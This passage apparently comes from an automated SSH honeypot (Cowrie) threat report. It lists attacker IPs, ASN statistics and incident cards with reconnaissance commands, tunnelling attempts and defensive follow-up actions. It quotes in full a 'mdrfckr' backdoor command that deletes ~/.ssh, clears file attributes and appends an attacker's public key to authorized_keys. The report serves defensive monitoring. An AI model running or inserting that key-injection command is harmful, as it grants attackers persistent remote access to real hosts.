export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `195.178.110.228`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `15.235.192.186`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **94** |
| Unique ASNs | **76** |
| High-Risk ASNs | **60** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS63949` | Akamai Connected Cloud | 6 | HIGH |
| `AS396982` | Google LLC | 5 | LOW |
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS9498` | BHARTI Airtel Ltd. | 2 | HIGH |
| `AS31898` | Oracle Corporation | 2 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS35042` | Layer7 Networks GmbH | 2 | HIGH |
| `AS4760` | HKT Limited | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (309)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-fac9cfa94aa9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 18:56 |
| **Last Seen** | 2026-08-15 18:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 18:56:46` | `cowrie.session.connect` |
| `2026-08-15 18:56:46` | `cowrie.client.version` |
| `2026-08-15 18:56:46` | `cowrie.client.kex` |
| `2026-08-15 18:56:47` | `cowrie.login.success` |
| `2026-08-15 18:56:49` | `cowrie.session.params` |
| `2026-08-15 18:56:49` | `cowrie.command.input` |
| `2026-08-15 18:56:49` | `cowrie.command.input` |
| `2026-08-15 18:56:49` | `cowrie.command.input` |
| `2026-08-15 18:56:49` | `cowrie.command.input` |
| `2026-08-15 18:56:49` | `cowrie.command.input` |
| `2026-08-15 18:56:49` | `cowrie.command.success` |
| `2026-08-15 18:56:49` | `cowrie.command.input` |
| `2026-08-15 18:56:49` | `cowrie.command.input` |
| `2026-08-15 18:56:49` | `cowrie.command.input` |
| `2026-08-15 18:56:49` | `cowrie.command.input` |
| `2026-08-15 18:56:49` | `cowrie.log.closed` |
| `2026-08-15 18:56:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cd6cd484961

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 18:58 |
| **Last Seen** | 2026-08-15 18:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 18:58:35` | `cowrie.session.connect` |
| `2026-08-15 18:58:35` | `cowrie.client.version` |
| `2026-08-15 18:58:35` | `cowrie.client.kex` |
| `2026-08-15 18:58:36` | `cowrie.login.success` |
| `2026-08-15 18:58:38` | `cowrie.session.params` |
| `2026-08-15 18:58:38` | `cowrie.command.input` |
| `2026-08-15 18:58:38` | `cowrie.command.input` |
| `2026-08-15 18:58:38` | `cowrie.command.input` |
| `2026-08-15 18:58:38` | `cowrie.command.input` |
| `2026-08-15 18:58:38` | `cowrie.command.input` |
| `2026-08-15 18:58:38` | `cowrie.command.success` |
| `2026-08-15 18:58:38` | `cowrie.command.input` |
| `2026-08-15 18:58:38` | `cowrie.command.input` |
| `2026-08-15 18:58:38` | `cowrie.command.input` |
| `2026-08-15 18:58:38` | `cowrie.command.input` |
| `2026-08-15 18:58:38` | `cowrie.log.closed` |
| `2026-08-15 18:58:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfbd10ee4020

| Field | Detail |
|---|---|
| **Source IP** | `197.242.170[.]10` |
| **First Seen** | 2026-08-15 18:58 |
| **Last Seen** | 2026-08-15 18:59 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 18:58:59` | `cowrie.session.connect` |
| `2026-08-15 18:58:59` | `cowrie.client.version` |
| `2026-08-15 18:58:59` | `cowrie.client.kex` |
| `2026-08-15 18:59:02` | `cowrie.login.success` |
| `2026-08-15 18:59:03` | `cowrie.direct-tcpip.request` |
| `2026-08-15 18:59:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.242.170[.]10` to AbuseIPDB if not already reported
- [ ] Block `197.242.170[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6d2151cb726

| Field | Detail |
|---|---|
| **Source IP** | `113.108.88[.]121` |
| **First Seen** | 2026-08-15 18:59 |
| **Last Seen** | 2026-08-15 18:59 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 18:59:09` | `cowrie.session.connect` |
| `2026-08-15 18:59:10` | `cowrie.client.version` |
| `2026-08-15 18:59:10` | `cowrie.client.kex` |
| `2026-08-15 18:59:12` | `cowrie.login.success` |
| `2026-08-15 18:59:13` | `cowrie.direct-tcpip.request` |
| `2026-08-15 18:59:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.108.88[.]121` to AbuseIPDB if not already reported
- [ ] Block `113.108.88[.]121` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0456d080b9d4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 19:00 |
| **Last Seen** | 2026-08-15 19:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:00:27` | `cowrie.session.connect` |
| `2026-08-15 19:00:27` | `cowrie.client.version` |
| `2026-08-15 19:00:27` | `cowrie.client.kex` |
| `2026-08-15 19:00:28` | `cowrie.login.success` |
| `2026-08-15 19:00:29` | `cowrie.session.params` |
| `2026-08-15 19:00:29` | `cowrie.command.input` |
| `2026-08-15 19:00:29` | `cowrie.command.input` |
| `2026-08-15 19:00:29` | `cowrie.command.input` |
| `2026-08-15 19:00:29` | `cowrie.command.input` |
| `2026-08-15 19:00:29` | `cowrie.command.input` |
| `2026-08-15 19:00:29` | `cowrie.command.success` |
| `2026-08-15 19:00:29` | `cowrie.command.input` |
| `2026-08-15 19:00:29` | `cowrie.command.input` |
| `2026-08-15 19:00:29` | `cowrie.command.input` |
| `2026-08-15 19:00:29` | `cowrie.command.input` |
| `2026-08-15 19:00:29` | `cowrie.log.closed` |
| `2026-08-15 19:00:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdf3e118c1bb

| Field | Detail |
|---|---|
| **Source IP** | `124.67.120[.]106` |
| **First Seen** | 2026-08-15 19:01 |
| **Last Seen** | 2026-08-15 19:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:01:47` | `cowrie.session.connect` |
| `2026-08-15 19:01:48` | `cowrie.client.version` |
| `2026-08-15 19:01:48` | `cowrie.client.kex` |
| `2026-08-15 19:01:50` | `cowrie.login.success` |
| `2026-08-15 19:01:51` | `cowrie.direct-tcpip.request` |
| `2026-08-15 19:01:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.67.120[.]106` to AbuseIPDB if not already reported
- [ ] Block `124.67.120[.]106` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48d867d9a1eb

| Field | Detail |
|---|---|
| **Source IP** | `213.55.79[.]195` |
| **First Seen** | 2026-08-15 19:01 |
| **Last Seen** | 2026-08-15 19:02 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:01:57` | `cowrie.session.connect` |
| `2026-08-15 19:01:58` | `cowrie.client.version` |
| `2026-08-15 19:01:58` | `cowrie.client.kex` |
| `2026-08-15 19:02:01` | `cowrie.login.success` |
| `2026-08-15 19:02:02` | `cowrie.direct-tcpip.request` |
| `2026-08-15 19:02:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.55.79[.]195` to AbuseIPDB if not already reported
- [ ] Block `213.55.79[.]195` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-983d7ebded07

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 19:02 |
| **Last Seen** | 2026-08-15 19:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:02:30` | `cowrie.session.connect` |
| `2026-08-15 19:02:30` | `cowrie.client.version` |
| `2026-08-15 19:02:30` | `cowrie.client.kex` |
| `2026-08-15 19:02:31` | `cowrie.login.success` |
| `2026-08-15 19:02:32` | `cowrie.session.params` |
| `2026-08-15 19:02:32` | `cowrie.command.input` |
| `2026-08-15 19:02:32` | `cowrie.command.input` |
| `2026-08-15 19:02:32` | `cowrie.command.input` |
| `2026-08-15 19:02:32` | `cowrie.command.input` |
| `2026-08-15 19:02:32` | `cowrie.command.input` |
| `2026-08-15 19:02:32` | `cowrie.command.success` |
| `2026-08-15 19:02:32` | `cowrie.command.input` |
| `2026-08-15 19:02:32` | `cowrie.command.input` |
| `2026-08-15 19:02:32` | `cowrie.command.input` |
| `2026-08-15 19:02:32` | `cowrie.command.input` |
| `2026-08-15 19:02:32` | `cowrie.log.closed` |
| `2026-08-15 19:02:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-560997cee9bc

| Field | Detail |
|---|---|
| **Source IP** | `111.42.60[.]82` |
| **First Seen** | 2026-08-15 19:02 |
| **Last Seen** | 2026-08-15 19:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:02:43` | `cowrie.session.connect` |
| `2026-08-15 19:02:43` | `cowrie.client.version` |
| `2026-08-15 19:02:44` | `cowrie.client.kex` |
| `2026-08-15 19:02:45` | `cowrie.login.success` |
| `2026-08-15 19:02:46` | `cowrie.session.params` |
| `2026-08-15 19:02:46` | `cowrie.command.input` |
| `2026-08-15 19:02:46` | `cowrie.log.closed` |
| `2026-08-15 19:02:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.42.60[.]82` to AbuseIPDB if not already reported
- [ ] Block `111.42.60[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1333eab88cb1

| Field | Detail |
|---|---|
| **Source IP** | `114.98.63[.]18` |
| **First Seen** | 2026-08-15 19:04 |
| **Last Seen** | 2026-08-15 19:04 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:04:04` | `cowrie.session.connect` |
| `2026-08-15 19:04:05` | `cowrie.client.version` |
| `2026-08-15 19:04:05` | `cowrie.client.kex` |
| `2026-08-15 19:04:07` | `cowrie.login.success` |
| `2026-08-15 19:04:08` | `cowrie.direct-tcpip.request` |
| `2026-08-15 19:04:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.98.63[.]18` to AbuseIPDB if not already reported
- [ ] Block `114.98.63[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb1e9b1934fc

| Field | Detail |
|---|---|
| **Source IP** | `62.182.132[.]94` |
| **First Seen** | 2026-08-15 19:04 |
| **Last Seen** | 2026-08-15 19:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:04:14` | `cowrie.session.connect` |
| `2026-08-15 19:04:15` | `cowrie.client.version` |
| `2026-08-15 19:04:15` | `cowrie.client.kex` |
| `2026-08-15 19:04:16` | `cowrie.login.success` |
| `2026-08-15 19:04:16` | `cowrie.direct-tcpip.request` |
| `2026-08-15 19:04:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.182.132[.]94` to AbuseIPDB if not already reported
- [ ] Block `62.182.132[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03e9fc4918fa

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 19:04 |
| **Last Seen** | 2026-08-15 19:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:04:21` | `cowrie.session.connect` |
| `2026-08-15 19:04:21` | `cowrie.client.version` |
| `2026-08-15 19:04:21` | `cowrie.client.kex` |
| `2026-08-15 19:04:22` | `cowrie.login.success` |
| `2026-08-15 19:04:24` | `cowrie.session.params` |
| `2026-08-15 19:04:24` | `cowrie.command.input` |
| `2026-08-15 19:04:24` | `cowrie.command.input` |
| `2026-08-15 19:04:24` | `cowrie.command.input` |
| `2026-08-15 19:04:24` | `cowrie.command.input` |
| `2026-08-15 19:04:24` | `cowrie.command.input` |
| `2026-08-15 19:04:24` | `cowrie.command.success` |
| `2026-08-15 19:04:24` | `cowrie.command.input` |
| `2026-08-15 19:04:24` | `cowrie.command.input` |
| `2026-08-15 19:04:24` | `cowrie.command.input` |
| `2026-08-15 19:04:24` | `cowrie.command.input` |
| `2026-08-15 19:04:24` | `cowrie.log.closed` |
| `2026-08-15 19:04:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8895df89358d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 19:06 |
| **Last Seen** | 2026-08-15 19:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:06:05` | `cowrie.session.connect` |
| `2026-08-15 19:06:05` | `cowrie.client.version` |
| `2026-08-15 19:06:05` | `cowrie.client.kex` |
| `2026-08-15 19:06:06` | `cowrie.login.success` |
| `2026-08-15 19:06:08` | `cowrie.session.params` |
| `2026-08-15 19:06:08` | `cowrie.command.input` |
| `2026-08-15 19:06:08` | `cowrie.command.input` |
| `2026-08-15 19:06:08` | `cowrie.command.input` |
| `2026-08-15 19:06:08` | `cowrie.command.input` |
| `2026-08-15 19:06:08` | `cowrie.command.input` |
| `2026-08-15 19:06:08` | `cowrie.command.success` |
| `2026-08-15 19:06:08` | `cowrie.command.input` |
| `2026-08-15 19:06:08` | `cowrie.command.input` |
| `2026-08-15 19:06:08` | `cowrie.command.input` |
| `2026-08-15 19:06:08` | `cowrie.command.input` |
| `2026-08-15 19:06:08` | `cowrie.log.closed` |
| `2026-08-15 19:06:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-955750fe9a86

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 19:07 |
| **Last Seen** | 2026-08-15 19:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:07:44` | `cowrie.session.connect` |
| `2026-08-15 19:07:44` | `cowrie.client.version` |
| `2026-08-15 19:07:44` | `cowrie.client.kex` |
| `2026-08-15 19:07:45` | `cowrie.login.success` |
| `2026-08-15 19:07:46` | `cowrie.session.params` |
| `2026-08-15 19:07:46` | `cowrie.command.input` |
| `2026-08-15 19:07:46` | `cowrie.command.input` |
| `2026-08-15 19:07:46` | `cowrie.command.input` |
| `2026-08-15 19:07:46` | `cowrie.command.input` |
| `2026-08-15 19:07:46` | `cowrie.command.input` |
| `2026-08-15 19:07:46` | `cowrie.command.success` |
| `2026-08-15 19:07:46` | `cowrie.command.input` |
| `2026-08-15 19:07:46` | `cowrie.command.input` |
| `2026-08-15 19:07:46` | `cowrie.command.input` |
| `2026-08-15 19:07:46` | `cowrie.command.input` |
| `2026-08-15 19:07:47` | `cowrie.log.closed` |
| `2026-08-15 19:07:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fdd21ccef1b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 19:09 |
| **Last Seen** | 2026-08-15 19:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 19:09:24` | `cowrie.session.connect` |
| `2026-08-15 19:09:25` | `cowrie.client.version` |
| `2026-08-15 19:09:25` | `cowrie.client.kex` |
| `2026-08-15 19:09:25` | `cowrie.login.success` |
| `2026-08-15 19:09:26` | `cowrie.session.params` |
